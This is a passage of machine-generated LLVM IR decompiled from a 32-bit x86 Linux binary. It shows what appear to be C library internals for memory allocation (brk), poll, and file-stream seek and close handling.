dec_label_pc_8055c78:                             ; preds = %dec_label_pc_8055ab7
  %v0_8055c78 = call i32 @function_8054608()
  %v1_8055c7d = inttoptr i32 %v0_8055c78 to i32*
  store i32 3, i32* %v1_8055c7d, align 4
  br label %dec_label_pc_8055c83

dec_label_pc_8055c83:                             ; preds = %dec_label_pc_8055a5c, %dec_label_pc_8055c6a, %dec_label_pc_8055c78
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8055a70, i32* @eax, align 4
  %v2_8055c8f = call i32 @function_805405a(i32 %v2_8055a70, i32 1)
  store i32 %v0_8055a5c, i32* @ebp, align 4
  ret i32 %v2_8055c8f

; uselistorder directives
  uselistorder i32 %v0_8055ae5.pre, { 1, 0 }
  uselistorder i32 %v6_8055adb51, { 1, 0 }
  uselistorder i8 %v2_8055adb48, { 1, 2, 0 }
  uselistorder i8* %v1_8055adb47, { 1, 0 }
  uselistorder i32 %v0_8055adb.pre, { 1, 0 }
  uselistorder i32 %v0_8055c0b, { 0, 2, 1 }
  uselistorder i32 %v0_8055bae, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-196.011, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8055b46, { 1, 0 }
  uselistorder i32 %v2_8055b27, { 1, 0 }
  uselistorder i32 %v1_8055b1b, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8055aea, { 1, 0 }
  uselistorder i32 %v1_8055ada, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @function_8054608, { 2, 5, 4, 3, 1, 0, 6 }
  uselistorder i32* @global_var_8064f78.402, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 2, 1, 3, 4, 0 }
  uselistorder i32 164, { 2, 1, 0 }
  uselistorder i32* @global_var_8064f74.338, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805e888.337 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_8055c83, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055c4e, { 0, 3, 4, 2, 5, 6, 7, 1, 8 }
  uselistorder label %dec_label_pc_8055c43, { 1, 0 }
  uselistorder label %dec_label_pc_8055be3, { 1, 0 }
  uselistorder label %dec_label_pc_8055c0b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8055bb9, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8055bae, { 1, 0 }
  uselistorder label %dec_label_pc_8055b64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055b5d, { 1, 0 }
  uselistorder label %dec_label_pc_8055b54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055b41, { 1, 0 }
  uselistorder label %dec_label_pc_8055b22, { 1, 0 }
  uselistorder label %dec_label_pc_8055c4e.preheader, { 1, 0 }
}

define i32 @function_8055ca0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8055ca0:
  %v9_8055cc3 = inttoptr i32 %arg3 to i32*
  %v10_8055cc3 = call i32 @function_8056f01(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8055cc3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8055cc3
}

define i32 @function_8055ccc(i32 %arg1) local_unnamed_addr {
dec_label_pc_8055ccc:
  %v0_8055ccf = call i32 @function_8050c3c()
  %v0_8055cd4 = load i32, i32* @edx, align 4
  %v4_8055cdb = call i32 @function_8050cd8(i32 %v0_8055ccf, i32 %arg1, i32 %v0_8055cd4, i32 %v0_8055cd4)
  ret i32 %v4_8055cdb
}

define i32 @function_8055ce4() local_unnamed_addr {
dec_label_pc_8055ce4:
  %v0_8055ce4 = load i32, i32* @eax, align 4
  %v1_8055ce4 = add i32 %v0_8055ce4, 28
  %v2_8055ce4 = inttoptr i32 %v1_8055ce4 to i32*
  %v3_8055ce4 = load i32, i32* %v2_8055ce4, align 4
  store i32 %v3_8055ce4, i32* @global_var_8064f7c.411, align 4
  %v1_8055ced = add i32 %v0_8055ce4, 44
  %v2_8055ced = inttoptr i32 %v1_8055ced to i32*
  %v3_8055ced = load i32, i32* %v2_8055ced, align 4
  store i32 %v3_8055ced, i32* @global_var_8064f80.412, align 128
  ret i32 %v3_8055ced
}

define i32 @function_8055cf8(i32 %arg1) local_unnamed_addr {
dec_label_pc_8055cf8:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055cf8 = load i32, i32* @ebx, align 4
  store i32 %v0_8055cf8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8055d0b = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8055d0b, i32* @global_var_8064b44.389, align 4
  %v7_8055d16 = icmp ult i32 %v1_8055d0b, %arg1
  %v1_8055d18 = icmp eq i1 %v7_8055d16, false
  br i1 %v1_8055d18, label %dec_label_pc_8055d28, label %dec_label_pc_8055d1a

dec_label_pc_8055d1a:                             ; preds = %dec_label_pc_8055cf8
  %v0_8055d1a = load i32, i32* %stack_var_-4, align 4
  %v1_8055d1a = call i32 @function_8050f90(i32 %v0_8055d1a)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8055d22 = inttoptr i32 %v1_8055d1a to i32*
  store i32 12, i32* %v1_8055d22, align 4
  %v0_8055d29.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055d28

dec_label_pc_8055d28:                             ; preds = %dec_label_pc_8055cf8, %dec_label_pc_8055d1a
  %v0_8055d29 = phi i32 [ 0, %dec_label_pc_8055cf8 ], [ %v0_8055d29.pre, %dec_label_pc_8055d1a ]
  %v2_8055d2c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055d2c, i32* @ebx, align 4
  ret i32 %v0_8055d29

; uselistorder directives
  uselistorder i32 %v1_8055d0b, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8064b44.389, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055d28, { 1, 0 }
}

define i32 @function_8055d30() local_unnamed_addr {
dec_label_pc_8055d30:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8055d30 = load i32, i32* @edi, align 4
  store i32 %v0_8055d30, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_8055d40 = load i32, i32* @ebx, align 4
  %v1_8055d41 = inttoptr i32 %tmp4 to %pollfd*
  %v5_8055d48 = call i32 @poll(%pollfd* %v1_8055d41, i32 %tmp3, i32 %tmp)
  store i32 %v0_8055d40, i32* @ebx, align 4
  store i32 %v5_8055d48, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_8055d48, -4095
  br i1 %tmp10, label %dec_label_pc_8055d60, label %dec_label_pc_8055d54

dec_label_pc_8055d54:                             ; preds = %dec_label_pc_8055d30
  %v1_8055d54 = call i32 @function_8050f90(i32 %v0_8055d40)
  %v0_8055d59 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055d59 = sub i32 0, %v0_8055d59
  %v2_8055d5b = inttoptr i32 %v1_8055d54 to i32*
  store i32 %v1_8055d59, i32* %v2_8055d5b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055d60

dec_label_pc_8055d60:                             ; preds = %dec_label_pc_8055d30, %dec_label_pc_8055d54
  %v0_8055d61 = phi i32 [ %v5_8055d48, %dec_label_pc_8055d30 ], [ -1, %dec_label_pc_8055d54 ]
  %v2_8055d64 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055d64, i32* @edi, align 4
  ret i32 %v0_8055d61

; uselistorder directives
  uselistorder i32 %v5_8055d48, { 1, 0, 2 }
  uselistorder i32 %v0_8055d40, { 1, 0 }
  uselistorder label %dec_label_pc_8055d60, { 1, 0 }
}

define i32 @function_8055d68(i16* %arg1) local_unnamed_addr {
dec_label_pc_8055d68:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_8055d6f = ptrtoint i16* %arg1 to i32
  store i32 %v4_8055d6f, i32* @esi, align 4
  %v1_8055d73 = add i32 %v4_8055d6f, 52
  %v2_8055d73 = inttoptr i32 %v1_8055d73 to i32*
  %v3_8055d73 = load i32, i32* %v2_8055d73, align 4
  store i32 %v3_8055d73, i32* @ebp, align 4
  %v1_8055d76 = icmp eq i32 %v3_8055d73, 0
  %v1_8055d78 = icmp eq i1 %v1_8055d76, false
  br i1 %v1_8055d78, label %dec_label_pc_8055d99, label %dec_label_pc_8055d7a

dec_label_pc_8055d7a:                             ; preds = %dec_label_pc_8055d68
  %v1_8055d7a = add i32 %v4_8055d6f, 56
  store i32 %v1_8055d7a, i32* @ebx, align 4
  %v2_8055d84 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055d84, i32* @eax, align 4
  %v2_8055d89 = call i32 @function_805405a(i32 %v2_8055d84, i32 134561879)
  %v0_8055d8e = load i32, i32* @ebx, align 4
  %v1_8055d91 = call i32 @function_8054057(i32 %v0_8055d8e)
  store i32 %v1_8055d91, i32* @eax, align 4
  %v0_8055d9b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055d99

dec_label_pc_8055d99:                             ; preds = %dec_label_pc_8055d68, %dec_label_pc_8055d7a
  %v0_8055da3 = phi i32 [ %v4_8055d6f, %dec_label_pc_8055d68 ], [ %v0_8055d9b.pre, %dec_label_pc_8055d7a ]
  store i32 0, i32* @edi, align 4
  %v1_8055d9b = inttoptr i32 %v0_8055da3 to i8*
  %v2_8055d9b = load i8, i8* %v1_8055d9b, align 1
  %v3_8055d9b = and i8 %v2_8055d9b, 64
  %v4_8055d9b = icmp eq i8 %v3_8055d9b, 0
  br i1 %v4_8055d9b, label %dec_label_pc_8055d99.dec_label_pc_8055dae_crit_edge, label %dec_label_pc_8055da0

dec_label_pc_8055d99.dec_label_pc_8055dae_crit_edge: ; preds = %dec_label_pc_8055d99
  br label %dec_label_pc_8055dae

dec_label_pc_8055da0:                             ; preds = %dec_label_pc_8055d99
  %v1_8055da4 = inttoptr i32 %v0_8055da3 to i16*
  %v2_8055da4 = call i32 @function_80563f8(i16* %v1_8055da4)
  store i32 %v2_8055da4, i32* @edi, align 4
  %v0_8055db1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055dae

dec_label_pc_8055dae:                             ; preds = %dec_label_pc_8055d99.dec_label_pc_8055dae_crit_edge, %dec_label_pc_8055da0
  %v0_8055db1 = phi i32 [ %v0_8055da3, %dec_label_pc_8055d99.dec_label_pc_8055dae_crit_edge ], [ %v0_8055db1.pre, %dec_label_pc_8055da0 ]
  %v1_8055db1 = add i32 %v0_8055db1, 4
  %v2_8055db1 = inttoptr i32 %v1_8055db1 to i32*
  %v3_8055db1 = load i32, i32* %v2_8055db1, align 4
  %v1_8055db4 = call i32 @function_8050b60(i32 %v3_8055db1)
  %v0_8055dbc = load i32, i32* @esi, align 4
  %v1_8055dbc = add i32 %v0_8055dbc, 4
  %v2_8055dbc = inttoptr i32 %v1_8055dbc to i32*
  store i32 -1, i32* %v2_8055dbc, align 4
  %v2_8055dcd = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8055dcd, i32* @ebx, align 4
  %v2_8055dd2 = icmp slt i32 %v1_8055db4, 0
  store i32 -1, i32* @eax, align 4
  %v1_8055dd9 = load i32, i32* @edi, align 4
  %v3_8055dd9 = select i1 %v2_8055dd2, i32 -1, i32 %v1_8055dd9
  store i32 %v3_8055dd9, i32* @edi, align 4
  %v2_8055ddc = call i32 @function_805405a(i32 %v2_8055dcd, i32 134561879)
  %v1_8055de8 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e658.308 to i32))
  %v0_8055ded = load i32, i32* @global_var_80628e4.413, align 4
  %v1_8055df2 = add i32 %v0_8055ded, 1
  store i32 %v1_8055df2, i32* @global_var_80628e4.413, align 4
  store i32 ptrtoint (i32* @global_var_805e658.308 to i32), i32* @eax, align 4
  %v2_8055dfd = call i32 @function_805405a(i32 %v2_8055dcd, i32 1)
  %v0_8055e02 = load i32, i32* @esi, align 4
  %v1_8055e02 = inttoptr i32 %v0_8055e02 to i32*
  %v2_8055e02 = load i32, i32* %v1_8055e02, align 4
  %v1_8055e07 = and i32 %v2_8055e02, 24576
  %v1_8055e0c = or i32 %v1_8055e07, 48
  store i32 %v1_8055e0c, i32* @eax, align 4
  %v1_8055e11 = trunc i32 %v1_8055e0c to i16
  %v3_8055e11 = inttoptr i32 %v0_8055e02 to i16*
  store i16 %v1_8055e11, i16* %v3_8055e11, align 2
  br i1 %v1_8055d78, label %dec_label_pc_8055e27, label %dec_label_pc_8055e16

dec_label_pc_8055e16:                             ; preds = %dec_label_pc_8055dae
  %v2_8055e1a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8055e1a, i32* @eax, align 4
  %v2_8055e1f = call i32 @function_805405a(i32 %v2_8055e1a, i32 1)
  store i32 %v2_8055e1f, i32* @eax, align 4
  br label %dec_label_pc_8055e27

dec_label_pc_8055e27:                             ; preds = %dec_label_pc_8055dae, %dec_label_pc_8055e16
  %v0_8055e27 = load i32, i32* @esi, align 4
  %v1_8055e27 = add i32 %v0_8055e27, 1
  %v2_8055e27 = inttoptr i32 %v1_8055e27 to i8*
  %v3_8055e27 = load i8, i8* %v2_8055e27, align 1
  %v4_8055e27 = and i8 %v3_8055e27, 64
  %v5_8055e27 = icmp eq i8 %v4_8055e27, 0
  br i1 %v5_8055e27, label %dec_label_pc_8055e3b, label %dec_label_pc_8055e2d

dec_label_pc_8055e2d:                             ; preds = %dec_label_pc_8055e27
  %v1_8055e30 = add i32 %v0_8055e27, 8
  %v2_8055e30 = inttoptr i32 %v1_8055e30 to i32*
  %v3_8055e30 = load i32, i32* %v2_8055e30, align 4
  %v1_8055e33 = call i32 @function_8053391(i32 %v3_8055e30)
  store i32 %v1_8055e33, i32* @eax, align 4
  br label %dec_label_pc_8055e3b

dec_label_pc_8055e3b:                             ; preds = %dec_label_pc_8055e27, %dec_label_pc_8055e2d
  %v2_8055e47 = call i32 @function_805405a(i32 %v2_8055dcd, i32 134561879)
  %v1_8055e53 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_805e658.308 to i32))
  store i32 ptrtoint (i32* @global_var_805e658.308 to i32), i32* @eax, align 4
  %v0_8055e59 = load i32, i32* @global_var_80628e8.414, align 8
  %v1_8055e59 = add i32 %v0_8055e59, 1
  store i32 %v1_8055e59, i32* @global_var_80628e8.414, align 8
  %v2_8055e63 = call i32 @function_805405a(i32 %v2_8055dcd, i32 1)
  %v0_8055e68 = call i32 @function_8056314()
  %v0_8055e70 = load i32, i32* @edi, align 4
  ret i32 %v0_8055e70

; uselistorder directives
  uselistorder i32 %v2_8055dcd, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32)* @function_8050b60, { 10, 2, 1, 0, 17, 16, 15, 14, 9, 8, 7, 6, 5, 4, 3, 13, 12, 11 }
  uselistorder label %dec_label_pc_8055e3b, { 1, 0 }
  uselistorder label %dec_label_pc_8055e27, { 1, 0 }
  uselistorder label %dec_label_pc_8055dae, { 1, 0 }
  uselistorder label %dec_label_pc_8055d99, { 1, 0 }
}

define i32 @function_8055e78(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8055e78:
  %v4_8055e87 = inttoptr i32 %arg2 to i8*
  %v5_8055e87 = call i32 @function_8056038(i32 %arg1, i8* %v4_8055e87, i32 0, i32 -1)
  ret i32 %v5_8055e87
}

define i32 @function_8055e90(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055e90:
  %v1_8055e9b = ashr i32 %arg2, 31
  %v4_8055ea2 = inttoptr i32 %arg1 to i16*
  %v5_8055ea2 = call i32 @function_8055eac(i16* %v4_8055ea2, i32 %arg2, i32 %v1_8055e9b, i32 %arg3)
  ret i32 %v5_8055ea2
}

define i32 @function_8055eac(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055eac:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8055eac = load i32, i32* @ebp, align 4
  %v0_8055ead = load i32, i32* @edi, align 4
  %v0_8055eae = load i32, i32* @esi, align 4
  %v0_8055eaf = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8055ebf = ptrtoint i16* %arg1 to i32
  store i32 %v4_8055ebf, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp = icmp ult i32 %arg4, 3
  br i1 %tmp, label %dec_label_pc_8055ee3, label %dec_label_pc_8055ed0

dec_label_pc_8055ed0:                             ; preds = %dec_label_pc_8055eac
  %v1_8055ed0 = call i32 @function_8050f90(i32 %arg2)
  store i32 %v1_8055ed0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_8055ed8 = inttoptr i32 %v1_8055ed0 to i32*
  store i32 22, i32* %v1_8055ed8, align 4
  br label %dec_label_pc_8055f89

dec_label_pc_8055ee3:                             ; preds = %dec_label_pc_8055eac
  %v1_8055ee3 = add i32 %v4_8055ebf, 52
  %v2_8055ee3 = inttoptr i32 %v1_8055ee3 to i32*
  %v3_8055ee3 = load i32, i32* %v2_8055ee3, align 4
  %v1_8055ee6 = icmp eq i32 %v3_8055ee3, 0
  %v1_8055ee8 = icmp eq i1 %v1_8055ee6, false
  br i1 %v1_8055ee8, label %dec_label_pc_8055f09, label %dec_label_pc_8055eea

dec_label_pc_8055eea:                             ; preds = %dec_label_pc_8055ee3
  %v1_8055eea = add i32 %v4_8055ebf, 56
  store i32 %v1_8055eea, i32* @ebx, align 4
  %v2_8055ef4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8055ef4, i32* @eax, align 4
  %v3_8055ef9 = call i32 @function_805405a(i32 %v2_8055ef4, i32 134561879)
  store i32 %v3_8055ef9, i32* %eax.global-to-local, align 4
  %v0_8055efe = load i32, i32* @ebx, align 4
  %v2_8055f01 = call i32 @function_8054057(i32 %v0_8055efe)
  store i32 %v2_8055f01, i32* %eax.global-to-local, align 4
  %v0_8055f09.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055f09

dec_label_pc_8055f09:                             ; preds = %dec_label_pc_8055ee3, %dec_label_pc_8055eea
  %v0_8055f11 = phi i32 [ %v4_8055ebf, %dec_label_pc_8055ee3 ], [ %v0_8055f09.pre, %dec_label_pc_8055eea ]
  %v1_8055f09 = inttoptr i32 %v0_8055f11 to i8*
  %v2_8055f09 = load i8, i8* %v1_8055f09, align 1
  %v3_8055f09 = and i8 %v2_8055f09, 64
  %v4_8055f09 = icmp eq i8 %v3_8055f09, 0
  br i1 %v4_8055f09, label %dec_label_pc_8055f1e, label %dec_label_pc_8055f0e

dec_label_pc_8055f0e:                             ; preds = %dec_label_pc_8055f09
  %v2_8055f12 = call i32 @function_805116c(i32 %v0_8055f11)
  store i32 %v2_8055f12, i32* %eax.global-to-local, align 4
  %v1_8055f1a = icmp eq i32 %v2_8055f12, 0
  %v1_8055f1c = icmp eq i1 %v1_8055f1a, false
  br i1 %v1_8055f1c, label %dec_label_pc_8055f71, label %dec_label_pc_8055f1e

dec_label_pc_8055f1e:                             ; preds = %dec_label_pc_8055f0e, %dec_label_pc_8055f09
  %v0_8055f1e = load i32, i32* @edi, align 4
  %v9_8055f1e = icmp eq i32 %v0_8055f1e, 1
  %v1_8055f21 = icmp eq i1 %v9_8055f1e, false
  br i1 %v1_8055f21, label %dec_label_pc_8055f1e.dec_label_pc_8055f37_crit_edge, label %dec_label_pc_8055f23

dec_label_pc_8055f1e.dec_label_pc_8055f37_crit_edge: ; preds = %dec_label_pc_8055f1e
  %.pre5 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8055f37

dec_label_pc_8055f23:                             ; preds = %dec_label_pc_8055f1e
  %v0_8055f23 = load i32, i32* @ecx, align 4
  %v2_8055f25 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8055f25, i32* %eax.global-to-local, align 4
  %v0_8055f2a = load i32, i32* @esi, align 4
  %v5_8055f2a = inttoptr i32 %v0_8055f2a to i16*
  %v6_8055f2b = call i32 @function_8055f94(i16* %v5_8055f2a, i32 %v2_8055f25, i32 %v0_8055f23, i32 %v0_8055f23)
  store i32 %v6_8055f2b, i32* %eax.global-to-local, align 4
  %v2_8055f33 = icmp slt i32 %v6_8055f2b, 0
  br i1 %v2_8055f33, label %dec_label_pc_8055f71, label %dec_label_pc_8055f23.dec_label_pc_8055f37_crit_edge

dec_label_pc_8055f23.dec_label_pc_8055f37_crit_edge: ; preds = %dec_label_pc_8055f23
  %v0_8055f38.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8055f37

dec_label_pc_8055f37:                             ; preds = %dec_label_pc_8055f1e.dec_label_pc_8055f37_crit_edge, %dec_label_pc_8055f23.dec_label_pc_8055f37_crit_edge
  %v2_8055f39.pre-phi = phi i32 [ %.pre5, %dec_label_pc_8055f1e.dec_label_pc_8055f37_crit_edge ], [ %v2_8055f25, %dec_label_pc_8055f23.dec_label_pc_8055f37_crit_edge ]
  %v0_8055f38 = phi i32 [ %v0_8055f1e, %dec_label_pc_8055f1e.dec_label_pc_8055f37_crit_edge ], [ %v0_8055f38.pre, %dec_label_pc_8055f23.dec_label_pc_8055f37_crit_edge ]
  %v0_8055f37 = load i32, i32* @edx, align 4
  store i32 %v2_8055f39.pre-phi, i32* %eax.global-to-local, align 4
  %v0_8055f3e = load i32, i32* @esi, align 4
  %v5_8055f3f = inttoptr i32 %v2_8055f39.pre-phi to i32*
  %v6_8055f3f = call i32 @function_805627c(i32 %v0_8055f3e, i32* %v5_8055f3f, i32 %v0_8055f38, i32 %v0_8055f37)
  store i32 %v6_8055f3f, i32* %eax.global-to-local, align 4
  %v2_8055f47 = icmp slt i32 %v6_8055f3f, 0
  br i1 %v2_8055f47, label %dec_label_pc_8055f71, label %dec_label_pc_8055f4b

dec_label_pc_8055f4b:                             ; preds = %dec_label_pc_8055f37
  %v0_8055f4b = load i32, i32* @esi, align 4
  %v1_8055f4b = inttoptr i32 %v0_8055f4b to i32*
  %v2_8055f4b = load i32, i32* %v1_8055f4b, align 4
  store i32 %v2_8055f4b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8055f4f = add i32 %v0_8055f4b, 44
  %v2_8055f4f = inttoptr i32 %v1_8055f4f to i32*
  store i32 0, i32* %v2_8055f4f, align 4
  %v0_8055f56 = load i32, i32* @esi, align 4
  %v1_8055f56 = add i32 %v0_8055f56, 2
  %v2_8055f56 = inttoptr i32 %v1_8055f56 to i8*
  store i8 0, i8* %v2_8055f56, align 1
  %v0_8055f5a = load i32, i32* %eax.global-to-local, align 4
  %v1_8055f5a = and i32 %v0_8055f5a, -72
  store i32 %v1_8055f5a, i32* %eax.global-to-local, align 4
  %v1_8055f5d = trunc i32 %v1_8055f5a to i16
  %v2_8055f5d = load i32, i32* @esi, align 4
  %v3_8055f5d = inttoptr i32 %v2_8055f5d to i16*
  store i16 %v1_8055f5d, i16* %v3_8055f5d, align 2
  %v0_8055f60 = load i32, i32* @esi, align 4
  %v1_8055f60 = add i32 %v0_8055f60, 8
  %v2_8055f60 = inttoptr i32 %v1_8055f60 to i32*
  %v3_8055f60 = load i32, i32* %v2_8055f60, align 4
  store i32 %v3_8055f60, i32* %eax.global-to-local, align 4
  %v2_8055f63 = add i32 %v0_8055f60, 16
  %v3_8055f63 = inttoptr i32 %v2_8055f63 to i32*
  store i32 %v3_8055f60, i32* %v3_8055f63, align 4
  %v0_8055f66 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055f66 = load i32, i32* @esi, align 4
  %v2_8055f66 = add i32 %v1_8055f66, 20
  %v3_8055f66 = inttoptr i32 %v2_8055f66 to i32*
  store i32 %v0_8055f66, i32* %v3_8055f66, align 4
  %v0_8055f69 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055f69 = load i32, i32* @esi, align 4
  %v2_8055f69 = add i32 %v1_8055f69, 24
  %v3_8055f69 = inttoptr i32 %v2_8055f69 to i32*
  store i32 %v0_8055f69, i32* %v3_8055f69, align 4
  %v0_8055f6c = load i32, i32* %eax.global-to-local, align 4
  %v1_8055f6c = load i32, i32* @esi, align 4
  %v2_8055f6c = add i32 %v1_8055f6c, 28
  %v3_8055f6c = inttoptr i32 %v2_8055f6c to i32*
  store i32 %v0_8055f6c, i32* %v3_8055f6c, align 4
  br label %dec_label_pc_8055f74

dec_label_pc_8055f71:                             ; preds = %dec_label_pc_8055f37, %dec_label_pc_8055f23, %dec_label_pc_8055f0e
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055f74

dec_label_pc_8055f74:                             ; preds = %dec_label_pc_8055f4b, %dec_label_pc_8055f71
  br i1 %v1_8055ee8, label %dec_label_pc_8055f89, label %dec_label_pc_8055f78

dec_label_pc_8055f78:                             ; preds = %dec_label_pc_8055f74
  %v2_8055f7c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8055f7c, i32* @eax, align 4
  %v3_8055f81 = call i32 @function_805405a(i32 %v2_8055f7c, i32 1)
  store i32 %v3_8055f81, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055f89

dec_label_pc_8055f89:                             ; preds = %dec_label_pc_8055f74, %dec_label_pc_8055ed0, %dec_label_pc_8055f78
  %v0_8055f8c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055f8c, i32* %eax.global-to-local, align 4
  store i32 %v0_8055eaf, i32* @ebx, align 4
  store i32 %v0_8055eae, i32* @esi, align 4
  store i32 %v0_8055ead, i32* @edi, align 4
  store i32 %v0_8055eac, i32* @ebp, align 4
  ret i32 %v0_8055f8c

; uselistorder directives
  uselistorder i32 %v2_8055f39.pre-phi, { 1, 0 }
  uselistorder i32 %v0_8055f1e, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055f89, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055f74, { 1, 0 }
  uselistorder label %dec_label_pc_8055f37, { 1, 0 }
  uselistorder label %dec_label_pc_8055f09, { 1, 0 }
}

define i32 @function_8055f94(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8055f94:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_8055f9c = ptrtoint i16* %arg1 to i32
  store i32 %v4_8055f9c, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_8055fa4 = load i16, i16* %arg1, align 2
  %v3_8055fa4 = zext i16 %v2_8055fa4 to i32
  store i32 %v3_8055fa4, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_8055fa4, 4
  %v1_8055fa9 = zext i16 %tmp to i32
  %v2_8055fa9 = icmp eq i16 %tmp, 0
  br i1 %v2_8055fa9, label %dec_label_pc_8055fd8, label %dec_label_pc_8055fae

dec_label_pc_8055fae:                             ; preds = %dec_label_pc_8055f94
  %v1_8055fb0 = add nsw i32 %v1_8055fa9, -1
  %v8_8055fb0 = icmp eq i32 %v1_8055fb0, 0
  store i32 %v1_8055fb0, i32* @edx, align 4
  br i1 %v8_8055fb0, label %dec_label_pc_8055fd8, label %dec_label_pc_8055fb3

dec_label_pc_8055fb3:                             ; preds = %dec_label_pc_8055fae
  %v3_8055fb3 = and i32 %v3_8055fa4, 2048
  %v4_8055fb3 = icmp eq i32 %v3_8055fb3, 0
  br i1 %v4_8055fb3, label %dec_label_pc_8055fd8, label %dec_label_pc_8055fb8

dec_label_pc_8055fb8:                             ; preds = %dec_label_pc_8055fb3
  %v6_8055fb8 = sub nsw i32 1, %v1_8055fa9
  %v7_8055fb8 = and i32 %v1_8055fb0, %v6_8055fb8
  %v8_8055fb8 = icmp slt i32 %v7_8055fb8, 0
  %v9_8055fb8 = icmp eq i16 %tmp, 2
  %v10_8055fb8 = icmp ult i16 %tmp, 2
  %v3_8055fbb = icmp eq i1 %v10_8055fb8, %v8_8055fb8
  %v4_8055fbb = icmp eq i1 %v9_8055fb8, false
  %v5_8055fbb = and i1 %v4_8055fbb, %v3_8055fbb
  br i1 %v5_8055fbb, label %dec_label_pc_805602c, label %dec_label_pc_8055fbd

dec_label_pc_8055fbd:                             ; preds = %dec_label_pc_8055fb8
  %v1_8055fbd = add i32 %v4_8055f9c, 40
  %v2_8055fbd = inttoptr i32 %v1_8055fbd to i32*
  %v3_8055fbd = load i32, i32* %v2_8055fbd, align 4
  %v4_8055fbd = icmp eq i32 %v3_8055fbd, 0
